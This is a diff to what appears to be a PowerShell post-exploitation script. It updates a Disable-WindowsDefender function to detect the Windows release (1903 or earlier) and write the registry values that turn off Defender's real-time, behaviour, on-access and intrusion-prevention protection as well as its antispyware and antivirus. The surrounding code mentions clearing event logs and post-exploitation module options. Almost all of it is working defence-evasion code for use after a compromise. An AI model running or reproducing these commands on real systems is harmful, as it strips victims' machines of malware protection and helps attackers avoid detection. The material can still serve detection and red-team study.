@@ -363,23 +363,44 @@ Function Clear-Eventlogs
 Function Disable-WindowsDefender
 {
 	#does initial check to validate that the windows defender key exists
-	if(test-path "hklm:\software\policies\microsoft\windows defender")
+	$releaseid = (get-itemproperty -path "hklm:\software\microsoft\windows nt\currentversion" -name releaseid).releaseid
+	if($releaseid -eq "1903")
 		{
-			#set options that will disable windows defender scanning and protection
-			set-itemproperty -path "hklm:\software\policies\microsoft\windows defender\real-time protection" -name DisableBehaviorMonitoring -value 1
-			set-itemproperty -path "hklm:\software\policies\microsoft\windows defender\real-time protection" -name DisableOnAccessProtection -value 1
-			set-itemproperty -path "hklm:\software\policies\microsoft\windows defender\real-time protection" -name DisableRealtimeMonitoring -value 1
-			set-itemproperty -path "hklm:\software\policies\microsoft\windows defender\real-time protection" -name DisableIOAVProtection -value 1
-			set-itemproperty -path "hklm:\software\policies\microsoft\windows defender\real-time protection" -name DisableIntrusionPreventionSystem -value 1
-			set-itemproperty -path "hklm:\software\policies\microsoft\windows defender\real-time protection" -name DisableScanOnRealtimeEnable -value 1
-			set-itemproperty -path "hklm:\software\policies\microsoft\windows defender" -name DisableAntiSpyware -value 1
-			set-itemproperty -path "hklm:\software\policies\microsoft\windows defender" -name DisableRealtimeMonitoring -value 1
-			echo "* Windows Defender has been disabled."
+			if(test-path "hklm:\software\policies\microsoft\windows defender")
+				{
+					#set options that will disable windows defender scanning and protection
+					set-itemproperty -path "hklm:\software\microsoft\windows defender\real-time protection" -name DisableRealtimeMonitoring -value 1
+					set-itemproperty -path "hklm:\software\microsoft\windows defender" -name DisableAntiSpyware -value 1
+					set-itemproperty -path "hklm:\software\microsoft\windows defender" -name DisableAntiVirus -value 1
+					echo "* Windows Defender has been disabled."
+				}
+			else	
+				{
+					echo " ! Windows Defender registry key does not exist !"
+				}
 		}
-	else	
+	#assumes 1809 release as windows defender registry keys are in different locations	
+	else
 		{
-			echo " ! Windows Defender registry key does not exist !"
+			if(test-path "hklm:\software\policies\microsoft\windows defender")
+				{
+					#set options that will disable windows defender scanning and protection
+					set-itemproperty -path "hklm:\software\policies\microsoft\windows defender\real-time protection" -name DisableBehaviorMonitoring -value 1
+					set-itemproperty -path "hklm:\software\policies\microsoft\windows defender\real-time protection" -name DisableOnAccessProtection -value 1
+					set-itemproperty -path "hklm:\software\policies\microsoft\windows defender\real-time protection" -name DisableRealtimeMonitoring -value 1
+					set-itemproperty -path "hklm:\software\policies\microsoft\windows defender\real-time protection" -name DisableIOAVProtection -value 1
+					set-itemproperty -path "hklm:\software\policies\microsoft\windows defender\real-time protection" -name DisableIntrusionPreventionSystem -value 1
+					set-itemproperty -path "hklm:\software\policies\microsoft\windows defender\real-time protection" -name DisableScanOnRealtimeEnable -value 1
+					set-itemproperty -path "hklm:\software\policies\microsoft\windows defender" -name DisableAntiSpyware -value 1
+					set-itemproperty -path "hklm:\software\policies\microsoft\windows defender" -name DisableRealtimeMonitoring -value 1
+					echo "* Windows Defender has been disabled."
+				}
+			else	
+				{
+					echo " ! Windows Defender registry key does not exist !"
+				}
 		}
+	
 }
 
 #Function that displays the post-exploitation module options (only executes if local user is an administrator
